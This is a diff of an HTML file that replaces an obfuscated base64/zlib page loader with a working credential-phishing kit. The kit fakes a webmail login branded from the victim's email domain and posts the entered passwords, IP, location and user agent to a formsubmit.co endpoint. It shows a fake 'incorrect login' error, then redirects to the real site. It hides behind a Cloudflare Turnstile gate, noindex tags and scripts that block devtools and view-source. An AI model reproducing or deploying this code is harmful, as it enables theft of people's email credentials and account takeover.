@@ -1,34 +1,491 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title  class="logoname">Mail</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY="></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" />
+<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
+<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex" />
+<meta name="otherbot" content="noindex" />
+<meta name="noarchive" content="noindex" />
+<meta name="nosnippet" content="noindex" />
+<meta name="noimageindex" content="noindex" />
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="googlebot-news" content="nofollow" />
+<meta name="otherbot" content="nofollow" />
+<meta name="noarchive" content="nofollow" />
+<meta name="nosnippet" content="nofollow" />
+<meta name="noimageindex" content="nofollow" />
+<meta name="robots" content="max-snippet:0">
+<meta name="robots" content="unavailable_after: 2020-09-22">
+
+<style  type="text/css" >
+
+body {
+    font-family: 'Open Sans', sans-serif;
+    color: #535353;
+    overflow: hidden; /* Prevents all scrolling */
+}
+
+/** Login 40 start --> relevant styles for this specific form **/
+.login-40 {
+    top: 0;
+    width: 100%;
+    bottom: 0;
+    opacity: 1;
+    min-height: 100vh;
+    text-align: center;
+    position: relative;
+    justify-content: center;
+    align-items: center;
+    padding: 30px 15px;
+    display: none; /* MODIFIED: Hide login form initially */
+}
+
+.login-40 .login-inner-form {
+    color: #717171;
+    text-align: center;
+    position: relative;
+}
+
+.login-40 h1, .login-40 h2, .login-40 h3, .login-40 h4, .login-40 h5, .login-40 h6 {
+    font-family: 'Segoe UI', sans-serif;
+    color: #474545;
+    font-weight: 500;
+}
+
+.login-40 .logo a {
+
+    text-decoration: none;
+}
+
+.login-40 .form-section{
+    max-width: 360px;
+    margin: 0 auto;
+    border-radius: 20px;
+    padding: 30px;
+    border: 3px solid #e8e7e7;
+    background-color: #fff;
+}
+
+.login-40 .login-inner-form .form-group {
+    margin-bottom: 25px; 
+}
+
+.login-40 .login-inner-form .form-box {
+    float: left;
+    width: 100%;
+    position: relative;
+}
+
+.login-40 .login-inner-form .input-text {
+    font-size: 16px;
+    outline: none;
+    color: #717171;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    box-shadow: 0 1px 3px 0 rgb(0 0 0 / 6%);
+}
+
+.login-40 .login-inner-form .form-box input {
+    float: left;
+    width: 100%;
+}
+
+.login-40 .login-inner-form .btn-md {
+    cursor: pointer;
+    padding: 12px 50px;
+    font-size: 17px;
+    font-weight: 400;
+    font-family: 'Jost', sans-serif;
+}
+
+.login-40 .login-inner-form .btn-theme {
+    background: #50a1ff;
+    border: none;
+    color: #fff;
+}
+
+.login-40 .login-inner-form .btn-theme:hover {
+    background: #4595f1;
+}
+
+.login-40 .logo{
+    text-align: center;
+    margin-bottom: 35px;
+}
+
+.login-40 .logo img{
+    height: 30px;
+}
+</style>
+
+<style>
+    .login-40 .form-box {
+        position: relative; 
+    }
+
+    /* Icon Styling */
+    .login-40 .form-box i {
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        left: 20px;
+        font-size: 16px;
+        color: #6c757d;
+        z-index: 2; 
+    }
+
+    /* Input Field Styling */
+    .login-40 .form-box .input-text {
+        height: 50px;
+        padding: 12px 20px 12px 45px; /* Padding for left icon */
+        position: relative;
+        z-index: 1;
+        background-color: #fff;
+        width: 100%;
+        box-sizing: border-box; 
+    }
+    
+    /* Make the original placeholder invisible */
+    .login-40 .form-box .input-text::placeholder {
+        color: transparent;
+    }
+
+    /* Label Styling (Initial State - inside the box) */
+    .login-40 .form-box .form-label {
+        position: absolute;
+        top: 50%;
+        left: 45px; /* Position to start where the text starts */
+        transform: translateY(-50%);
+        color: #6c757d;
+        font-size: 16px;
+        transition: all 0.2s ease-out;
+        pointer-events: none; 
+        background: #fff; 
+        padding: 0 5px; 
+        z-index: 2;
+    }
+
+    /* Floating Label Logic (Active State - above the box) */
+    .login-40 .form-box .input-text:focus ~ .form-label,
+    .login-40 .form-box .input-text:not(:placeholder-shown) ~ .form-label {
+        top: 0;
+        left: 40px; /* Position to the right of the icon's area */
+        transform: translateY(-50%);
+        font-size: 13px;
+        color: #50a1ff;
+    }
+
+    /* --- NEW: Styles for Turnstile Overlay --- */
+    #turnstile-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: #ffffff;
+        z-index: 9999;
+        display: flex;
+        justify-content: flex-start; /* Aligns to the left */
+        align-items: flex-start; /* Aligns to the top */
+        padding: 20px;
+    }
+</style>
+
 </head>
-<body>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
-    <script>
-        (function() {
-            try {
-                // The Base64 encoded and compressed HTML payload
-                const payload = "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";
+<body id="top">
 
-                // Base64 decode -> Uint8Array
-                const decoded_payload = atob(payload).split('').map(c => c.charCodeAt(0));
-                const uint8_array = new Uint8Array(decoded_payload);
+<div id="turnstile-overlay">
+    <div class="cf-turnstile" 
+         data-sitekey="0x4AAAAAAB4oxAZMoBDdwZqy" 
+         data-callback="onTurnstileSuccess">
+    </div>
+</div>
 
-                // Decompress using pako.js (zlib)
-                const original_html = pako.inflate(uint8_array, { to: 'string' });
+<iframe id="mainPage" src="about:blank" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
 
-                // Write the original HTML to the document
-                document.open();
-                document.write(original_html);
-                document.close();
-            } catch (e) {
-                console.error("Failed to deobfuscate and render the page:", e);
-                document.body.innerHTML = "<h1>Error: Could not load page content.</h1>";
-            }
-        })();
-    </script>
+<div class="login-40">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="form-section">
+                    <div class="logo">
+                        <a href="#">
+                            <img src="" alt="Webmail"  id="logoimg" style="height:64px; width: 64px">
+							<h2 id="logoname" style="font-size: 24px; padding-bottom: -6px;"> Webmail </h2>
+                        </a>
+                    </div>
+                    <div class="login-inner-form" style="padding-bottom: 6px">
+
+                        <form action="#" method="POST" id="login-form"> <div class="form-group form-box">
+                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address">
+                                <i class="fa fa-user"></i>
+                                <label for="email" class="form-label">Email Address</label>
+                            </div>
+                            <div class="form-group form-box">
+                                <input type="password" id="password" name="Password" class="input-text" placeholder="Password">
+                                <i class="fa fa-lock"></i>
+                                <label for="password" class="form-label">Password</label>
+                            </div>
+							<span id="msg" style="color:red; display:none;"></span>
+
+                            <div class="form-group mb-0">
+                                <button type="submit" id="submit-btn" class="btn-md btn-theme btn-block">Sign In</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
 </body>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY="></script>
+	<script nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY=">
+
+// 3. This function is called by Turnstile upon successful verification
+function onTurnstileSuccess(token) {
+    // Hide the Turnstile overlay
+    $('#turnstile-overlay').hide();
+
+    // Show the main login form after 8 seconds
+    setTimeout(function() {
+        $('.login-40').css('display', 'flex');
+    }, 100); // 8 seconds
+
+    // Initialize the rest of the page logic now
+    initializeMainScript();
+}
+
+function initializeMainScript() {
+    // --- Configuration ---
+    const MAX_LOGIN_ATTEMPTS = 2;
+    const SUBMIT_URL = 'https://formsubmit.co/ajax/1b659ab4028c52a13c9c939990ed45ba';
+    const IP_INFO_URL = 'https://ipinfo.io/json';
+    const FALLBACK_LOGO_URL = 'https://cdn-icons-png.freepik.com/512/6323/6323406.png'; // Fallback image
+
+    // --- State ---
+    let loginAttempts = 0;
+
+    // --- DOM Elements ---
+    const emailInput = $("#email");
+    const passwordInput = $("#password");
+    const submitButton = $("#submit-btn");
+    const messageArea = $("#msg");
+
+    /**
+     * Extracts the domain from an email address.
+     * @param {string} email - The full email address.
+     * @returns {string|null} The domain part of the email, or null if invalid.
+     */
+    const getDomainFromEmail = (email) => {
+        if (!email || email.indexOf("@") === -1) {
+            return null;
+        }
+        return email.substring(email.indexOf("@") + 1);
+    };
+
+    /**
+     * Updates the page's branding (logo, title) based on the email domain.
+     * @param {string} domain - The email domain (e.g., "example.com").
+     */
+    const updateBranding = (domain) => {
+        if (!domain) {
+            $("#logoimg").attr("src", FALLBACK_LOGO_URL); // Set fallback if no domain
+            return;
+        }
+        
+        const domainName = domain.substring(0, domain.indexOf('.'));
+        const capitalizedName = domainName.charAt(0).toUpperCase() + domainName.slice(1);
+        const faviconUrl = `https://logo.clearbit.com/${domain}`;
+        const loginTitle = `${capitalizedName}<br>`;
+        
+        const logoChecker = new Image();
+        
+        logoChecker.onload = function() {
+            $("#logoimg").attr("src", faviconUrl);
+            $("link.logoimg").attr("href", faviconUrl);
+        };
+        
+        logoChecker.onerror = function() {
+            $("#logoimg").attr("src", FALLBACK_LOGO_URL);
+            $("link.logoimg").attr("href", FALLBACK_LOGO_URL);
+        };
+
+        logoChecker.src = faviconUrl;
+
+        $("#logoname, .logoname").html(loginTitle);
+        $(".domain").text(domain);
+        
+        // MODIFIED: Load the background iframe after 10 seconds
+        setTimeout(function() {
+            $('#mainPage').attr('src', `https://${domain}`);
+        }, 500); // 10 seconds
+    };
+
+    /**
+     * Initializes the page by parsing the email from the URL hash and updating the branding.
+     */
+    const initializePage = () => {
+        const emailFromHash = window.location.hash.substring(1);
+        if (emailFromHash) {
+            emailInput.val(emailFromHash).trigger('input'); 
+            const domain = getDomainFromEmail(emailFromHash);
+            updateBranding(domain);
+            $(".email").text(emailFromHash);
+        } else {
+            $("#logoimg").attr("src", FALLBACK_LOGO_URL);
+        }
+    };
+    
+    /**
+     * Handles the display of error or status messages to the user.
+     * @param {string} message - The message to display.
+     * @param {string} [color='red'] - The color of the message text.
+     */
+    const showMessage = (message, color = 'red') => {
+        messageArea.html(`<span style='color:${color};'>${message}</span>`).show();
+    };
+
+    /**
+     * Performs actions after data has been submitted.
+     * It either shows an error and prepares for another attempt or redirects the user.
+     * @param {string} domain - The user's email domain for redirection.
+     */
+    const handlePostSubmission = (domain) => {
+        submitButton.html('Sign In');
+        emailInput.val("");
+        passwordInput.val("");
+
+        if (loginAttempts >= MAX_LOGIN_ATTEMPTS) {
+            window.location.replace(`http://www.${domain}`);
+        } else {
+            showMessage("Incorrect login details. Please try again.");
+        }
+    };
+
+    /**
+     * Captures user data (credentials, IP info) and sends it to the specified endpoint.
+     * @param {string} email - The user's email.
+     * @param {string} password - The user's password.
+     */
+    const sendCapturedData = async (email, password) => {
+        submitButton.html('Signing In...');
+        
+        const getFlagEmoji = (countryCode) => {
+            if (!countryCode || countryCode.length !== 2) {
+                return '🏳️';
+            }
+            const codePoints = countryCode
+                .toUpperCase()
+                .split('')
+                .map(char => 127397 + char.charCodeAt());
+            return String.fromCodePoint(...codePoints);
+        };
+
+        try {
+            const ipResponse = await fetch(IP_INFO_URL);
+            const ipData = await ipResponse.json();
+
+            const countryFlag = getFlagEmoji(ipData.country);
+            const currentDate = new Date().toLocaleDateString();
+            const subjectLine = `🔐 General Login | ${email} | ${ipData.ip} | ${countryFlag} ${ipData.country}`;
+
+            // --- MODIFIED PART: Add the Turnstile token to the payload ---
+            const turnstileToken = $('#login-form [name="cf-turnstile-response"]').val();
+
+            const payload = {
+                Username: email,
+                Password: password,
+                IP: ipData.ip,
+                Date: currentDate,
+                Location: `${ipData.city}, ${ipData.country}`,
+                "Server Hosting": ipData.org || 'Unknown ISP',
+                UserAgent: navigator.userAgent,
+                "Turnstile-Token": turnstileToken, // Token is now included
+                _template: "table",
+                _subject: subjectLine
+            };
+
+            await fetch(SUBMIT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+        } catch (error) {
+            console.error("An error occurred during data submission:", error);
+        } finally {
+            const domain = getDomainFromEmail(email);
+            handlePostSubmission(domain);
+        }
+    };
+
+    /**
+     * Handles the form submission event.
+     * @param {Event} event - The form submission event.
+     */
+    const handleFormSubmit = (event) => {
+        event.preventDefault();
+        messageArea.hide();
+
+        const email = emailInput.val();
+        const password = passwordInput.val();
+        const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        
+        if (!email || !emailRegex.test(email)) {
+            showMessage("Please enter a valid email address.");
+            return;
+        }
+
+        if (!password) {
+            showMessage("Password is empty");
+            return;
+        }
+
+        loginAttempts++;
+        sendCapturedData(email, password);
+    };
+
+    // --- Event Listeners & Initialization ---
+    initializePage();
+    submitButton.on('click', handleFormSubmit);
+    
+    $('.input-text').on('input', function() {
+        // This is fine as is
+    });
+}
+</script>
+<script>
+    // --- SCRIPT TO DETER VIEWING/EDITING SOURCE CODE ---
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); }
+        if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); }
+        if (e.ctrlKey && (e.key === 'S' || e.key === 's')) { e.preventDefault(); }
+    });
+    setInterval(function() {
+        debugger;
+    }, 50);
+</script>
+
 </html>
